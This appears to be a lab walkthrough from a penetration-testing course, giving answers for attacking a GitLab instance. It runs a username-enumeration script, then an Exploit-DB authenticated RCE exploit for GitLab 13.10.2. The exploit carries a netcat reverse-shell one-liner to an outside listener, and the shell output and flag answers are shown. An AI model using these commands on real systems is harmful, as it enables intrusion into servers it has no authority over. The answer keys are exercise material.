# Attacking Gitlab
## Username Enumeration
Use this script: https://github.com/dpgg101/GitLabUserEnum

## Questions
1. Find another valid user on the target GitLab instance. **Answer: demo**
   - Use the script to enumerate for usernames:
        ```
        $ wget https://raw.githubusercontent.com/dpgg101/GitLabUserEnum/main/gitlab_userenum.py
        $ python gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081 --wordlist /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
        GitLab User Enumeration in python
        [+] The username bob exists!
        [+] The username root exists!
        [+] The username demo exists!
        ```
2. Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in. **Answer: s3cure_y0ur_Rep0s!**
   - Gitlab 13.10.2 is vulnerable to an authenticated RCE, use [this](https://www.exploit-db.com/download/49951) script with the registered account to achieve RCE:
        ```
        $ python 49951.py -u test -p 12345678 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 8888 >/tmp/f' -t http://gitlab.inlanefreight.local:8081/ 
        [1] Authenticating
        /home/htb-ac-1863259/Downloads/49951.py:35: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
        token = soup.findAll('meta')[16].get("content")
        Successfully Authenticated
        [2] Creating Payload 
        [3] Creating Snippet and Uploading
        /home/htb-ac-1863259/Downloads/49951.py:77: DeprecationWarning: Call to deprecated method findAll. (Replaced by find_all) -- Deprecated since version 4.0.0.
        csrf = soup.findAll('meta')[16].get("content")
        ```
        ```
        $ nc -nlvp 8888
        Listening on 0.0.0.0 8888


        Connection received on 10.129.201.88 41100
        sh: 0: can't access tty; job control turned off
        $ $ $ pwd
        /var/opt/gitlab/gitlab-workhorse
        $ ls
        VERSION
        config.toml
        flag_gitlab.txt
        sockets
        $ cat flag_gitlab.txt
        s3cure_y0ur_Rep0s!
        ```